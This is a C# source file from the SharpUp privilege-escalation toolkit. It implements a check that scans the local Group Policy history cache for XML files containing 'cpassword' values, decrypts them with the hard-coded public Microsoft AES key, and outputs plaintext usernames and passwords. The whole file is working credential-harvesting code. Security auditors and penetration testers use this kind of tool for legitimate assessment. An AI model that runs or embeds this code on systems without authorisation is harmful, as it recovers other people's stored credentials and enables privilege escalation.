﻿using SharpUp.Classes;
using System;
using System.Collections.Generic;
using System.Linq;
using System.Security.Cryptography;
using System.Text;
using System.Xml;
using static SharpUp.Utilities.FileUtils;

namespace SharpUp.Checks
{
    public class CachedGPPPassword : VulnerabilityCheck
    {
        private static string allUsers = System.Environment.GetEnvironmentVariable("ALLUSERSPROFILE");
        public CachedGPPPassword()
        {
            _name = "Cached GPP Password";
            try
            {
                if (!allUsers.Contains("ProgramData"))
                {
                    // Before Windows Vista, the default value of AllUsersProfile was "C:\Documents and Settings\All Users"
                    // And after, "C:\ProgramData"
                    allUsers += "\\Application Data";
                }
                allUsers += "\\Microsoft\\Group Policy\\History"; // look only in the GPO cache folder

                List<String> files = FindFiles(allUsers, "*.xml");

                // files will contain all XML files
                foreach (string file in files)
                {
                    if (!(file.Contains("Groups.xml") || file.Contains("Services.xml")
                        || file.Contains("Scheduledtasks.xml") || file.Contains("DataSources.xml")
                        || file.Contains("Printers.xml") || file.Contains("Drives.xml")))
                    {
                        continue; // uninteresting XML files, move to next
                    }

                    XmlDocument xmlDoc = new XmlDocument();
                    xmlDoc.Load(file);

                    if (!xmlDoc.InnerXml.Contains("cpassword"))
                    {
                        continue; // no "cpassword" => no interesting content, move to next
                    }

                    //Console.WriteLine("\r\n{0}", file);
                    _isVulnerable = true;
                    string cPassword = "";
                    string UserName = "";
                    string NewName = "";
                    string Changed = "";
                    if (file.Contains("Groups.xml"))
                    {
                        XmlNode a = xmlDoc.SelectSingleNode("/Groups/User/Properties");
                        XmlNode b = xmlDoc.SelectSingleNode("/Groups/User");
                        foreach (XmlAttribute attr in a.Attributes)
                        {
                            if (attr.Name.Equals("cpassword"))
                            {
                                cPassword = attr.Value;
                            }
                            if (attr.Name.Equals("userName"))
                            {
                                UserName = attr.Value;
                            }
                            if (attr.Name.Equals("newName"))
                            {
                                NewName = attr.Value;
                            }
                        }
                        foreach (XmlAttribute attr in b.Attributes)
                        {
                            if (attr.Name.Equals("changed"))
                            {
                                Changed = attr.Value;
                            }
                        }
                        //Console.WriteLine("\r\nA{0}", a.Attributes[0].Value);
                    }
                    else if (file.Contains("Services.xml"))
                    {
                        XmlNode a = xmlDoc.SelectSingleNode("/NTServices/NTService/Properties");
                        XmlNode b = xmlDoc.SelectSingleNode("/NTServices/NTService");
                        foreach (XmlAttribute attr in a.Attributes)
                        {
                            if (attr.Name.Equals("cpassword"))
                            {
                                cPassword = attr.Value;
                            }
                            if (attr.Name.Equals("accountName"))
                            {
                                UserName = attr.Value;
                            }
                        }
                        foreach (XmlAttribute attr in b.Attributes)
                        {
                            if (attr.Name.Equals("changed"))
                            {
                                Changed = attr.Value;
                            }
                        }

                    }
                    else if (file.Contains("Scheduledtasks.xml"))
                    {
                        XmlNode a = xmlDoc.SelectSingleNode("/ScheduledTasks/Task/Properties");
                        XmlNode b = xmlDoc.SelectSingleNode("/ScheduledTasks/Task");
                        foreach (XmlAttribute attr in a.Attributes)
                        {
                            if (attr.Name.Equals("cpassword"))
                            {
                                cPassword = attr.Value;
                            }
                            if (attr.Name.Equals("runAs"))
                            {
                                UserName = attr.Value;
                            }
                        }
                        foreach (XmlAttribute attr in b.Attributes)
                        {
                            if (attr.Name.Equals("changed"))
                            {
                                Changed = attr.Value;
                            }
                        }

                    }
                    else if (file.Contains("DataSources.xml"))
                    {
                        XmlNode a = xmlDoc.SelectSingleNode("/DataSources/DataSource/Properties");
                        XmlNode b = xmlDoc.SelectSingleNode("/DataSources/DataSource");
                        foreach (XmlAttribute attr in a.Attributes)
                        {
                            if (attr.Name.Equals("cpassword"))
                            {
                                cPassword = attr.Value;
                            }
                            if (attr.Name.Equals("username"))
                            {
                                UserName = attr.Value;
                            }
                        }
                        foreach (XmlAttribute attr in b.Attributes)
                        {
                            if (attr.Name.Equals("changed"))
                            {
                                Changed = attr.Value;
                            }
                        }
                    }
                    else if (file.Contains("Printers.xml"))
                    {
                        XmlNode a = xmlDoc.SelectSingleNode("/Printers/SharedPrinter/Properties");
                        XmlNode b = xmlDoc.SelectSingleNode("/Printers/SharedPrinter");
                        foreach (XmlAttribute attr in a.Attributes)
                        {
                            if (attr.Name.Equals("cpassword"))
                            {
                                cPassword = attr.Value;
                            }
                            if (attr.Name.Equals("username"))
                            {
                                UserName = attr.Value;
                            }
                        }
                        foreach (XmlAttribute attr in b.Attributes)
                        {
                            if (attr.Name.Equals("changed"))
                            {
                                Changed = attr.Value;
                            }
                        }
                    }
                    else
                    {
                        // Drives.xml
                        XmlNode a = xmlDoc.SelectSingleNode("/Drives/Drive/Properties");
                        XmlNode b = xmlDoc.SelectSingleNode("/Drives/Drive");
                        foreach (XmlAttribute attr in a.Attributes)
                        {
                            if (attr.Name.Equals("cpassword"))
                            {
                                cPassword = attr.Value;
                            }
                            if (attr.Name.Equals("username"))
                            {
                                UserName = attr.Value;
                            }
                        }
                        foreach (XmlAttribute attr in b.Attributes)
                        {
                            if (attr.Name.Equals("changed"))
                            {
                                Changed = attr.Value;
                            }
                        }

                    }

                    if (UserName.Equals(""))
                    {
                        UserName = "[BLANK]";
                    }

                    if (NewName.Equals(""))
                    {
                        NewName = "[BLANK]";
                    }


                    if (cPassword.Equals(""))
                    {
                        cPassword = "[BLANK]";
                    }
                    else
                    {
                        cPassword = DecryptGPP(cPassword);
                    }

                    if (Changed.Equals(""))
                    {
                        Changed = "[BLANK]";
                    }

                    _details.Add($"UserName: {UserName} | NewName: {NewName} | cPassword: {cPassword} | Changed: {Changed}");
                }
            }
            catch (Exception ex)
            {
                
            }
        }

        private static string DecryptGPP(string cpassword)
        {
            int mod = cpassword.Length % 4;

            switch (mod)
            {
                case 1:
                    cpassword = cpassword.Substring(0, cpassword.Length - 1);
                    break;
                case 2:
                    cpassword += "".PadLeft(4 - mod, '=');
                    break;
                case 3:
                    cpassword += "".PadLeft(4 - mod, '=');
                    break;
                default:
                    break;
            }

            byte[] base64decoded = Convert.FromBase64String(cpassword);

            AesCryptoServiceProvider aesObject = new AesCryptoServiceProvider();

            byte[] aesKey = { 0x4e, 0x99, 0x06, 0xe8, 0xfc, 0xb6, 0x6c, 0xc9, 0xfa, 0xf4, 0x93, 0x10, 0x62, 0x0f, 0xfe, 0xe8, 0xf4, 0x96, 0xe8, 0x06, 0xcc, 0x05, 0x79, 0x90, 0x20, 0x9b, 0x09, 0xa4, 0x33, 0xb6, 0x6c, 0x1b };
            byte[] aesIV = new byte[aesObject.IV.Length];

            aesObject.IV = aesIV;
            aesObject.Key = aesKey;

            ICryptoTransform aesDecryptor = aesObject.CreateDecryptor();
            byte[] outBlock = aesDecryptor.TransformFinalBlock(base64decoded, 0, base64decoded.Length);

            return System.Text.UnicodeEncoding.Unicode.GetString(outBlock);
        }
    }
}
